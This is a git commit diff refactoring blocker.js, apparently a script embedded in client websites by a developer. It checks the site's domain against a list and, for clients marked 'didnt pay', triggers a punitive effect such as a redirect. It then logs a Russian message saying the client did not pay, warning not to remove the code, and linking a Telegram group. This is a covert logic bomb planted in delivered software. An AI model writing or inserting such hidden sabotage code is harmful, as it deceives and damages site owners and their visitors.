8f6d8f10d4059c62ceebc81bd140eada045eb764
Daniel <72696191+deusnotam@users.noreply.github.com>
2024-02-17 13:25:18 +0100

    Update blocker.js

--- blocker.js
+++ blocker.js
@@ -52,28 +52,23 @@ const effects = {
   }
 };
     
-// Функция для проверки домена
-function checkDomain() {
+  // Функция для проверки домена
+  function checkDomain() {
     const currentDomain = window.location.hostname;
 
     // Проверка, есть ли текущий домен в списке
     const siteInfo = sites.find(site => currentDomain === new URL(site.url).hostname);
 
-    if (!siteInfo) {
-        // Обработка случая, когда домен не найден в списке
-        console.log("Наказаний не найдено. Заказчик чист.");
-    } else {
-        // Проверка, если case у домена равен "didnt pay"
-        if (siteInfo.cause === "didnt pay") {
-            // Применение эффекта, если домен найден в списке и case равен "didnt pay"
-            const effectFunction = effects[siteInfo.effect];
-            if (effectFunction) {
-                effectFunction(siteInfo.redirecturl || siteInfo.date);
-                console.log(`Этот заказчик ${siteInfo.date} не оплатил заказанную работу, поэтому будь осторожен и не удаляй этот код. По всем вопросам пиши сюда \nTelegram Group → https://t.me/d3usn0tam`);
-            }
-        }
+    // Проверка, если case у домена равен "didnt pay"
+    if (siteInfo && siteInfo.cause === "didnt pay") {
+      // Применение эффекта, если домен найден в списке и case равен "didnt pay"
+      const effectFunction = effects[siteInfo.effect];
+      if (effectFunction) {
+        effectFunction(siteInfo.redirecturl || siteInfo.date);
+        console.log(`Этот заказчик ${siteInfo.date} не оплатил заказанную работу, поэтому будь осторожен и не удаляй этот код. По всем вопросам пиши сюда \nTelegram Group → https://t.me/d3usn0tam`);
+      }
     }
-}
+  }
 
 // Вызов функции для проверки домена
 checkDomain();
